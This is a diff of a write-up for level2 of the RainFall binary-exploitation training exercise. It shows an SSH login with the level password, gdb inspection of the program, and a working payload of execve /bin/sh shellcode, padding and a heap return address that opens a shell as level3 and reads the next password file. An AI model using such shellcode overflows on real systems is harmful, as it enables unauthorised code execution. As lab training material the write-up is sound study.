@@ -1,17 +1,7 @@
 Login as `level2`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.1.28 -p 4242 -l level2
-	  _____       _       ______    _ _
-	 |  __ \     (_)     |  ____|  | | |
-	 | |__) |__ _ _ _ __ | |__ __ _| | |
-	 |  _  /  _` | | '_ \|  __/ _` | | |
-	 | | \ \ (_| | | | | | | | (_| | | |
-	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
-
-                 Good luck & Have fun
-
-  To start, ssh with level0/level0 on 192.168.1.28:4242
 level2@192.168.1.28's password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
   GCC stack protector support:            Enabled
   Strict user copy checks:                Disabled
@@ -76,7 +66,7 @@ End of assembler dump.
 (gdb) break *p+105
 Breakpoint 1 at 0x804853d
 ```
-Run executable with recognazible pattern to fill array.
+Run executable with recognizable pattern to fill array.
 ```gdb
 (gdb) run <<< $(python -c "print 'A' * 64")
 Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 64")
@@ -124,7 +114,7 @@ Mapped address spaces:
 0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
 0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
-As NX is disabled, put a shellcode on HEAP and ovewrite EIP so that it holds HEAPs address. 
+As NX is disabled, put a shellcode on HEAP and overwrite EIP so that it holds HEAPs address. 
 ```gdb
 (gdb) info frame
 Stack level 0, frame at 0xbffff730:
@@ -135,11 +125,13 @@ Stack level 0, frame at 0xbffff730:
  Saved registers:
   ebp at 0xbffff728, eip at 0xbffff72c
 ```
-At this point in time, it might be easier to use someone elses shellcode. So, refering to shellcodes database for study cases, choose a simple one [811](http://shell-storm.org/shellcode/files/shellcode-811.php).
+At this point in time, it might be easier to use someone else shellcode. So, referring to shell codes database for study cases, choose a simple one [811](http://shell-storm.org/shellcode/files/shellcode-811.php).
+
+Exploit and log on to the next level.
 ```shell
 level2@RainFall:~$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm' + '\x08\xa0\x04\x08'"; cat -)  | ./level2
 1�Ph//shh/bin����°
-                   ̀1�@̀aaaabbbbccccddddeeeeffffgggghhhhiiikkkkllllmmm�
+                   ̀1�@̀aaaabbbbccccddddeeeeffffgggghhhhiiikkkkllllmmm�
 whoami
 level3
 cat /home/user/level3/.pass
